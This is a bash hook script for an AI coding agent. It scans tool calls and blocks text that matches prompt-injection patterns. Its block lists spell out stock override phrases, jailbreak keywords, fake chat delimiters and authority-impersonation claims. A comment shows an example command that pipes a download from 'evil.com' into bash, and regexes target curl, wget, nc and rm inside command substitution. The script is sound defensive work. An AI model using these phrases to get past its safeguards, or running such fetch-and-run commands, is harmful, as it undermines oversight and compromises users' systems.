#!/usr/bin/env bash
# Hook: PreToolUse - Detect prompt injection attempts
# Exit 0 = allow, Exit 2 = block (stderr message shown to Claude)
#
# This hook detects common prompt injection patterns that attempt to
# manipulate Claude's behavior through malicious instructions.
#
# Place in: .claude/hooks/prompt-injection-detector.sh
# Register in: .claude/settings.json under PreToolUse event

set -e

# Read JSON from stdin
INPUT=$(cat)

TOOL_NAME=$(echo "$INPUT" | jq -r '.tool_name // empty')
TOOL_INPUT=$(echo "$INPUT" | jq -r '.tool_input // empty')

# Only check tools that handle user-provided text content
case "$TOOL_NAME" in
    Bash|Write|Edit|WebFetch)
        ;;
    *)
        exit 0
        ;;
esac

# Extract content to analyze based on tool type
# CONTENT_JQ_FILTER is kept separately (plain string, no risk) so the
# null-byte check further below can re-apply the same filter through a
# pure pipe, without ever passing the result through a bash variable.
CONTENT=""
CONTENT_JQ_FILTER=""
case "$TOOL_NAME" in
    Bash)
        CONTENT_JQ_FILTER='.command // empty'
        ;;
    Write|Edit)
        CONTENT_JQ_FILTER='.content // .new_string // empty'
        ;;
    WebFetch)
        CONTENT_JQ_FILTER='.url // empty'
        ;;
esac
CONTENT=$(echo "$TOOL_INPUT" | jq -r "$CONTENT_JQ_FILTER")

# Skip if no content to analyze
[[ -z "$CONTENT" ]] && exit 0

# Convert to lowercase for case-insensitive matching
CONTENT_LOWER=$(echo "$CONTENT" | tr '[:upper:]' '[:lower:]')

# === ROLE OVERRIDE PATTERNS ===
# Attempts to override Claude's instructions or identity
ROLE_OVERRIDE_PATTERNS=(
    "ignore previous instructions"
    "ignore all previous"
    "ignore your instructions"
    "disregard previous"
    "disregard your instructions"
    "forget your instructions"
    "forget everything"
    "you are now"
    "act as if"
    "pretend you are"
    "pretend to be"
    "from now on you"
    "new instructions:"
    "override:"
    "system prompt:"
)

for pattern in "${ROLE_OVERRIDE_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        echo "BLOCKED: Prompt injection detected - role override attempt: '$pattern'" >&2
        exit 2
    fi
done

# === JAILBREAK PATTERNS ===
# Known jailbreak techniques and bypass attempts
JAILBREAK_PATTERNS=(
    "dan mode"
    "developer mode"
    "jailbreak"
    "do anything now"
    "bypass"
    "no restrictions"
    "without restrictions"
    "unrestricted mode"
    "god mode"
    "sudo mode"
    "admin mode"
    "debug mode"
    "maintenance mode"
)

for pattern in "${JAILBREAK_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        echo "BLOCKED: Prompt injection detected - jailbreak attempt: '$pattern'" >&2
        exit 2
    fi
done

# === DELIMITER INJECTION ===
# Attempts to inject fake system messages or close prompt sections
DELIMITER_PATTERNS=(
    "</system>"
    "<|endoftext|>"
    "<|im_end|>"
    "[/INST]"
    "[INST]"
    "<<SYS>>"
    "<</SYS>>"
    "### System:"
    "### Human:"
    "### Assistant:"
    '```system'
    "SYSTEM:"
)

for pattern in "${DELIMITER_PATTERNS[@]}"; do
    if [[ "$CONTENT" == *"$pattern"* ]]; then
        echo "BLOCKED: Prompt injection detected - delimiter injection: '$pattern'" >&2
        exit 2
    fi
done

# === AUTHORITY IMPERSONATION ===
# Claims of special authority or permissions
AUTHORITY_PATTERNS=(
    "anthropic employee"
    "anthropic staff"
    "i am your creator"
    "i am your developer"
    "i have admin access"
    "authorized to bypass"
    "emergency override"
    "security exception"
    "this is a test"
    "testing mode"
)

for pattern in "${AUTHORITY_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        echo "BLOCKED: Prompt injection detected - authority impersonation: '$pattern'" >&2
        exit 2
    fi
done

# === BASE64 ENCODED INSTRUCTIONS ===
# Detect potential base64-encoded payloads (heuristic)
# Look for long base64-like strings that might contain instructions
if echo "$CONTENT" | grep -qE '[A-Za-z0-9+/]{50,}={0,2}'; then
    # Try to decode and check for injection patterns
    DECODED=$(echo "$CONTENT" | grep -oE '[A-Za-z0-9+/]{50,}={0,2}' | head -1 | base64 -d 2>/dev/null || true)
    DECODED_LOWER=$(echo "$DECODED" | tr '[:upper:]' '[:lower:]')

    for pattern in "ignore" "override" "system" "jailbreak" "dan mode"; do
        if [[ "$DECODED_LOWER" == *"$pattern"* ]]; then
            echo "BLOCKED: Prompt injection detected - encoded payload containing: '$pattern'" >&2
            exit 2
        fi
    done
fi

# === ANSI ESCAPE SEQUENCES ===
# Terminal manipulation via escape codes (CVE-related)
# \x1b[ CSI, \x1b] OSC, \x1b( charset selection
if echo "$CONTENT" | grep -qE $'\x1b\[|\x1b\]|\x1b\('; then
    echo "BLOCKED: ANSI escape sequence detected - potential terminal injection" >&2
    exit 2
fi

# === NULL BYTE INJECTION ===
# Null bytes can truncate strings and bypass security checks
# Portability note: BSD grep (macOS) has no -P (PCRE), so 'grep -qP' always
# fails with "invalid option -- P". On top of that, bash can NEVER retain a
# real \0 inside a variable (it is silently dropped on assignment via $()),
# so checking "$CONTENT" for \0 would never work on ANY system, even with
# GNU grep. The correct check compares stream size (via pipe, never
# materialized into a variable) before and after stripping null bytes,
# using LC_ALL=C to operate byte by byte.
CONTENT_RAW_SIZE=$(echo "$TOOL_INPUT" | jq -r "$CONTENT_JQ_FILTER" | wc -c | tr -d ' ')
CONTENT_STRIPPED_SIZE=$(echo "$TOOL_INPUT" | jq -r "$CONTENT_JQ_FILTER" | LC_ALL=C tr -d '\000' | wc -c | tr -d ' ')
if [ "$CONTENT_RAW_SIZE" != "$CONTENT_STRIPPED_SIZE" ]; then
    echo "BLOCKED: Null byte detected - potential truncation attack" >&2
    exit 2
fi

# === NESTED COMMAND EXECUTION ===
# Detect $() and backtick command substitution that could bypass denylists
# This catches patterns like: $(curl evil.com | bash) or `rm -rf /`
NESTED_CMD_PATTERNS=(
    '\$\([^)]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'
    '`[^`]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'
    '\$\([^)]*\b(rm|dd|mkfs|chmod|chown)\b'
    '`[^`]*\b(rm|dd|mkfs|chmod|chown)\b'
)

for pattern in "${NESTED_CMD_PATTERNS[@]}"; do
    if echo "$CONTENT" | grep -qE -e "$pattern"; then
        echo "BLOCKED: Nested command execution detected - potential bypass attempt" >&2
        exit 2
    fi
done

# === CONTEXT MANIPULATION ===
# Attempts to manipulate the conversation context
CONTEXT_PATTERNS=(
    "in the previous message"
    "as i mentioned earlier"
    "you agreed to"
    "you already said"
    "you promised"
    "remember when you"
    "our agreement was"
)

for pattern in "${CONTEXT_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        # Warning only - these could be legitimate
        echo '{"systemMessage": "Warning: Detected potential context manipulation pattern. Verify legitimacy."}'
    fi
done

# Allow by default
exit 0
